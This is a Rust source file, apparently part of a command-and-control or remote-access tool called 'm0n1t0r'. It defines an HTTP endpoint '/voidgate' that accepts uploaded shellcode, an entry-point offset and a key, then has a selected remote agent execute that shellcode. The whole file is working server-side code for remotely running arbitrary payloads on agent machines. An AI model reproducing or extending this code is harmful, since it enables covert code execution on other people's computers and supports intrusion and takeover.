use crate::web::{AppState, Response, Result as WebResult, api::client::get_agent};
use actix_multipart::form::{MultipartForm, bytes::Bytes, text::Text};
use actix_web::{
    Responder, post,
    web::{Json, Path},
};
use m0n1t0r_common::{client::Client as _, process::Agent as _};
use std::net::SocketAddr;

#[derive(MultipartForm)]
struct VoidgateForm {
    #[multipart(limit = "10MB")]
    shellcode: Bytes,
    ep_offset: Text<u32>,
    key: Text<String>,
}

#[post("/voidgate")]
pub async fn post(
    data: AppState,
    addr: Path<SocketAddr>,
    MultipartForm(form): MultipartForm<VoidgateForm>,
) -> WebResult<impl Responder> {
    let (agent, _) = get_agent!(data, &addr, process_agent)?;

    agent
        .voidgate(
            form.shellcode.data.to_vec(),
            form.ep_offset.into_inner(),
            form.key.into_inner(),
        )
        .await?;

    Ok(Json(Response::success(())?))
}
